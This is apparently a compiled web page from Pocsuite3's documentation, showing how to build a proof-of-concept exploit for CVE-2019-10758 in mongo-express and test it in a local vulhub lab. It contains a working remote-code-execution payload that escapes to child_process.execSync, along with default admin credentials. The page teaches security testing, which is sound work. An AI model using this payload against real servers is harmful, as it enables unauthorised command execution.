import{_ as s}from"./chunks/poc-demo-cve-2019-10758_verify.a4811ee0.js";import{_ as n,j as a,g as e,H as l}from"./chunks/framework.8815fd6f.js";const h=JSON.parse('{"title":"Mongo-express Authentication Remote Code Execution Vulnerability (CVE-2019-10758)","description":"","frontmatter":{},"headers":[{"level":2,"title":"PoC development","slug":"poc-development"},{"level":2,"title":"Preparing the vulnerable environment","slug":"preparing-the-vulnerable-environment"},{"level":2,"title":"Vulnerability verification","slug":"vulnerability-verification"}],"relativePath":"en/guide/poc-demo-cve-2019-10758.md","lastUpdated":null}'),o={name:"en/guide/poc-demo-cve-2019-10758.md"},p=l(`<h1 id="mongo-express-authentication-remote-code-execution-vulnerability-cve-2019-10758" tabindex="-1">Mongo-express Authentication Remote Code Execution Vulnerability (CVE-2019-10758) <a class="header-anchor" href="#mongo-express-authentication-remote-code-execution-vulnerability-cve-2019-10758" aria-hidden="true">#</a></h1><p>Vulnerability details: <a href="https://www.seebug.org/vuldb/ssvid-98116" target="_blank" rel="noreferrer">mongo-express Remote Code Execution Vulnerability (CVE-2019-10758)</a></p><p>Mongo-express is a web-based MongoDB admin interface written in Node.js, Express.js, and Bootstrap3.</p><p>Mongo-express before <code>0.54.0</code> is vulnerable to Remote Code Execution via endpoints that uses the <code>toBSON</code> method. A misuse of the <code>vm</code> dependency to perform <code>exec</code> commands in a non-safe environment. If the attacker can successfully log in, or the target server has not changed the default account password (<code>admin:pass</code>), then arbitrary node.js code can be executed.</p><h2 id="poc-development" tabindex="-1">PoC development <a class="header-anchor" href="#poc-development" aria-hidden="true">#</a></h2><p>Use <code>pocsuite --new</code> to generate the template. Since this is an OOB vulnerability, we use OOB interaction services such as <a href="http://www.ceye.io" target="_blank" rel="noreferrer">CEye</a> or <a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noreferrer">Interactsh</a> to assist verification.</p><div class="tip custom-block"><p class="custom-block-title">TIP</p><p>The Out-of-Band vulnerabilities, also known as OOB, are a series of alternative ways that an attacker uses to exploit a vulnerability that can\u2019t be detected by a traditional HTTP request-response interaction.</p></div><p><a href="https://github.com/projectdiscovery/interactsh" target="_blank" rel="noreferrer">Interactsh</a> is an open-source tool for detecting out-of-band interactions. It developed by projectdiscovery, a well-known open source software organization. As long as you have a domain, you can quickly build your own oob service. There are also some publicly available, such as: <code>interact.sh, oast.pro, oast.live, oast.site, oast.online, oast.fun, oast.me</code>.</p><p>Generate template.</p><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u279C pocsuite --new</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"><span style="color:#A6ACCD;">-----</span></span>
<span class="line"><span style="color:#A6ACCD;">Seebug ssvid </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">0</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: 98116</span></span>
<span class="line"><span style="color:#A6ACCD;">PoC author </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Seebug</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: Seebug</span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability disclosure date </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 2021-8-18</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">2022-7-11</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: 2020-01-03</span></span>
<span class="line"><span style="color:#A6ACCD;">Advisory URL </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.seebug.org/vuldb/ssvid-99335</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">https://www.seebug.org/vuldb/ssvid-98116</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability CVE number </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, CVE-2021-22123</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: CVE-2019-10758</span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, Fortinet</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">:</span></span>
<span class="line"><span style="color:#A6ACCD;">Product or component name </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, FortiWeb</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: mongo-express</span></span>
<span class="line"><span style="color:#A6ACCD;">Affected version </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;">=6.4.0</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: </span><span style="color:#89DDFF;">&lt;</span><span style="color:#A6ACCD;">=0.53.0</span></span>
<span class="line"><span style="color:#A6ACCD;">Vendor homepage </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, https://www.fortinet.com</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: https://github.com/mongo-express/mongo-express</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">0    Arbitrary File Read</span></span>
<span class="line"><span style="color:#A6ACCD;">1    Code Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">2    Command Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">3    Denial Of service</span></span>
<span class="line"><span style="color:#A6ACCD;">4    Information Disclosure</span></span>
<span class="line"><span style="color:#A6ACCD;">5    Login Bypass</span></span>
<span class="line"><span style="color:#A6ACCD;">6    Path Traversal</span></span>
<span class="line"><span style="color:#A6ACCD;">7    SQL Injection</span></span>
<span class="line"><span style="color:#A6ACCD;">8    SSRF</span></span>
<span class="line"><span style="color:#A6ACCD;">9    XSS</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability type, choose from above or provide </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 3</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: 1</span></span>
<span class="line"><span style="color:#A6ACCD;">Authentication Required </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, yes</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">no</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: yes  </span><span style="color:#676E95;font-style:italic;"># Auth required</span></span>
<span class="line"><span style="color:#A6ACCD;">Can we get result of </span><span style="color:#82AAFF;">command</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, yes</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">no</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: no  </span><span style="color:#676E95;font-style:italic;"># Out-of-Band vulnerabilities</span></span>
<span class="line"><span style="color:#A6ACCD;">Out-of-band server to use </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, interactsh</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[</span><span style="color:#A6ACCD;">ceye</span><span style="color:#89DDFF;">]</span><span style="color:#A6ACCD;">: interactsh</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"></span>
<span class="line"></span></code></pre></div><p>Simply modify the template according to the details of the vulnerability.</p><div class="language-diff"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">     def _options(self):</span></span>
<span class="line"><span style="color:#A6ACCD;">         o = OrderedDict()</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        o[&#39;user&#39;] = OptString(&#39;&#39;, description=&#39;The username to authenticate as&#39;, require=True)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        o[&#39;pwd&#39;] = OptString(&#39;&#39;, description=&#39;The password for the username&#39;, require=True)</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        o[&#39;user&#39;] = OptString(&#39;admin&#39;, description=&#39;The username to authenticate as&#39;, require=True)</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        o[&#39;pwd&#39;] = OptString(&#39;pass&#39;, description=&#39;The password for the username&#39;, require=True)</span></span>
<span class="line"><span style="color:#A6ACCD;">         o[&#39;cmd&#39;] = OptString(&#39;uname -a&#39;, description=&#39;The command to execute&#39;)</span></span>
<span class="line"><span style="color:#A6ACCD;">         return o</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">     def _exploit(self, param=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        if not self._check(dork=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        if not self._check(dork=&#39;mongo-express=&#39;):</span></span>
<span class="line"><span style="color:#A6ACCD;">             return False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">         user = self.get_option(&#39;user&#39;)</span></span>
<span class="line"><span style="color:#A6ACCD;">         pwd = self.get_option(&#39;pwd&#39;)</span></span>
<span class="line"><span style="color:#A6ACCD;">         headers = {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        payload = &#39;a=b&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        res = requests.post(self.url, headers=headers, data=payload)</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        payload = (</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            &#39;document=this.constructor.constructor(&quot;return process&quot;)().&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            f&#39;mainModule.require(&quot;child_process&quot;).execSync(&quot;{param}&quot;)&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        )</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        res = requests.post(f&#39;{self.url}/checkValid&#39;, headers=headers, data=payload, auth=(user, pwd))</span></span>
<span class="line"><span style="color:#A6ACCD;">         logger.debug(res.text)</span></span>
<span class="line"><span style="color:#A6ACCD;">         return res.text</span></span>
<span class="line"></span></code></pre></div><h2 id="preparing-the-vulnerable-environment" tabindex="-1">Preparing the vulnerable environment <a class="header-anchor" href="#preparing-the-vulnerable-environment" aria-hidden="true">#</a></h2><p>Create a vulnerability environment using <a href="https://github.com/vulhub/vulhub" target="_blank" rel="noreferrer">vulhub</a>.</p><div class="language-"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u250C\u2500\u2500(kali\u327Fkali)-[/tmp]</span></span>
<span class="line"><span style="color:#A6ACCD;">\u2514\u2500$ git clone https://github.com/vulhub/vulhub.git &amp;&amp; cd vulhub/mongo-express/CVE-2019-10758 &amp;&amp; docker-compose up -d</span></span>
<span class="line"><span style="color:#A6ACCD;">Cloning into &#39;vulhub&#39;...</span></span>
<span class="line"><span style="color:#A6ACCD;">remote: Enumerating objects: 12574, done.</span></span>
<span class="line"><span style="color:#A6ACCD;">remote: Total 12574 (delta 0), reused 0 (delta 0), pack-reused 12574</span></span>
<span class="line"><span style="color:#A6ACCD;">Receiving objects: 100% (12574/12574), 139.45 MiB | 1015.00 KiB/s, done.</span></span>
<span class="line"><span style="color:#A6ACCD;">Resolving deltas: 100% (5003/5003), done.</span></span>
<span class="line"><span style="color:#A6ACCD;">Creating network &quot;cve-2019-10758_default&quot; with the default driver</span></span>
<span class="line"><span style="color:#A6ACCD;">Creating cve-2019-10758_mongo_1 ... done</span></span>
<span class="line"><span style="color:#A6ACCD;">Creating cve-2019-10758_web_1   ... done</span></span>
<span class="line"><span style="color:#A6ACCD;">                                                                                                                                                                                 </span></span>
<span class="line"><span style="color:#A6ACCD;">\u250C\u2500\u2500(kali\u327Fkali)-[/tmp/vulhub/mongo-express/CVE-2019-10758]</span></span>
<span class="line"><span style="color:#A6ACCD;">\u2514\u2500$ curl -I localhost:8081</span></span>
<span class="line"><span style="color:#A6ACCD;">HTTP/1.1 200 OK</span></span>
<span class="line"><span style="color:#A6ACCD;">X-Powered-By: Express</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Type: text/html; charset=utf-8</span></span>
<span class="line"><span style="color:#A6ACCD;">Content-Length: 8199</span></span>
<span class="line"><span style="color:#A6ACCD;">ETag: W/&quot;2007-KWtm8qZk7ZuiLlUF3uCj0lng5+Q&quot;</span></span>
<span class="line"><span style="color:#A6ACCD;">Set-Cookie: mongo-express=s%3AaKAompVZQO7rTWLcDL0RqFa1FMt-ufPd.PTqXL2A%2BZm8I6o%2BT6Jz1xNLDTbbsJi1IS%2BmouRgrJns; Path=/; HttpOnly</span></span>
<span class="line"><span style="color:#A6ACCD;">Date: Thu, 14 Jul 2022 23:01:01 GMT</span></span>
<span class="line"><span style="color:#A6ACCD;">Connection: keep-alive</span></span>
<span class="line"><span style="color:#A6ACCD;">                                                                       </span></span>
<span class="line"><span style="color:#A6ACCD;"></span></span></code></pre></div><h2 id="vulnerability-verification" tabindex="-1">Vulnerability verification <a class="header-anchor" href="#vulnerability-verification" aria-hidden="true">#</a></h2><p>Through the command line parameter <code>--user admin --pwd pass --oob-server interact.sh</code> specifies the user name, password, and OOB service to be used. If not provided, the default value will be used.</p><p><img src="`+s+'" alt=""></p>',18),t=[p];function r(c,i,C,D,y,A){return e(),a("div",null,t)}var F=n(o,[["render",r]]);export{h as __pageData,F as default};
